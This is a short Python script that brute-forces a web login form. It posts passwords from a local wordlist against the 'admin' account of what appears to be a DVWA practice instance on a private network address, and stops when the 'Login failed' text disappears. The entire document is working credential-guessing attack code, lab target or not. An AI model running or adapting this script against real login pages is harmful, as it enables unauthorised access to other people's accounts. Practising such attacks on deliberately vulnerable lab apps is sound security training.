import requests
def bruteforce(username,url):
    for password in passwords:
        password = password.strip()
        print('[!!] trying to bruteforce password ' + password)
        data_dictionary = {'username':username, 'password':password, 'Login':'submit'}
        resp = requests.post(url, data_dictionary)
        if "Login failed" in str(resp.content):
            pass
        else:
            print("[+] username is: " + username)
            print("[+] pasword is: " + password)
            exit()

url = 'http://192.168.1.9/dvwa/login.php'
username = 'admin'

with open('/Users/fadi/Documents/python apps/passwords.txt','r') as passwords:
    bruteforce(username,url)
